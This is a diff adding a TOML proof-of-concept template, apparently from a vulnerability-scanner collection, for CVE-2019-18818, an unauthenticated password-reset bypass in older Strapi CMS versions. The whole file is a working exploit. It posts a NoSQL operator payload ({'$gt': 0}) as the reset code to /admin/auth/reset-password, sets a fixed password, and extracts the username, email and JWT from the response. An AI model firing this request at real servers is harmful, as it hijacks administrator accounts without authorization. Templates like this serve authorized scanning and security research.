@@ -1,0 +1,63 @@
+[info]
+author = "ave"
+description = "Strapi CMS 在 3.0.0-beta.17.5 之前的版本中，密码重置功能存在授权绕过漏洞。攻击者无需身份认证即可向 /admin/auth/reset-password 端点发送特制 POST 请求，绕过密码重置令牌验证机制，重置任意用户密码并获取管理员账户控制权。"
+id = "POC-AVE-2019-0137"
+name = "CVE-2019-18818 PoC"
+severity = "critical"
+tags = ["ave-2019-0137"]
+vuln_id = [
+    "CVE-2019-18818",
+    "AVE-2019-0137",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/admin/auth/reset-password"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"code": {"$gt": 0}, "password": "SuperStrongPassword1", "passwordConfirmation": "SuperStrongPassword1"}'
+type = "json"
+
+[[poc.requests.extractors]]
+json = [".user.username"]
+name = "username"
+part = "body"
+type = "json"
+
+[[poc.requests.extractors]]
+json = [".user.email"]
+name = "email"
+part = "body"
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+Host = "{{Hostname}}"
+Origin = "{{BaseURL}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["application/json"]
+
+[[poc.requests.matchers]]
+condition = "and"
+expect = true
+part = "body"
+type = "word"
+words = [
+    '"username"',
+    '"email"',
+    '"jwt"',
+]
